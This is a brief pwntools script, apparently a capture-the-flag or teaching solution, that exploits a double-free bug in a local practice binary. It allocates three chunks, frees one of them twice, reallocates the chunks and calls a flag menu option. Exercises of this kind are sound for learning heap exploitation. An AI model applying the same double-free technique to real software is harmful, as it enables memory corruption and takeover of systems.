from pwn import *

s = process("./double_free_basic_concept")
#context(log_level='debug')
raw_input('debug')
def malloc(index,content):
    s.sendlineafter("Your choice:",str(1));
    s.sendlineafter("Please choose the page u want:",str(index));
    s.sendlineafter(">>>",str(content));

def free(index):
    s.sendlineafter("Your choice:",str(2));
    s.sendlineafter("Please choose the page u want:",str(index));
def flag():
    s.sendlineafter("Your choice:",str(3));
malloc(1,'tuan1')
malloc(2,'tuan2')
malloc(3,'tuan3')
free(3)
free(1)
free(2)
free(1)
malloc(1,'a')
malloc(2,'b')
malloc(3,'c')
flag()
s.interactive();
s.close();

